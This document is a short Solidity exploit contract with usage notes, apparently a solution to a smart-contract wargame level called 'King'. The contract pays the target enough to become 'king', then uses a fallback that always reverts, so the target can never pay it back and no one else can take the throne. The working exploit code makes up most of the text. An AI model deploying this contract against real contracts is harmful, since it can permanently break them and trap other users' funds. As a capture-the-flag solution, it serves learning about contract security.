```javascript
pragma solidity ^0.6.0;

contract KingAttack {
    address payable public attack_addr;
    uint public balance;
    
    constructor(address payable addr) public payable {
        attack_addr = addr;
        balance = msg.value;
    }
    
    function attack() public payable{
        (bool success, ) = attack_addr.call{value:2000000000000000}("");
        require(success, "Failed to claim to be a king.");
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    fallback() external payable {
        revert("I am the eternal king.");
    }
}
```

First initialize this contract with `2000000000000000 wei` (more than the prize set in the King contract). Then, call attack to claim kingship. The `revert` fallback will prevent the level from reclaiming kingship.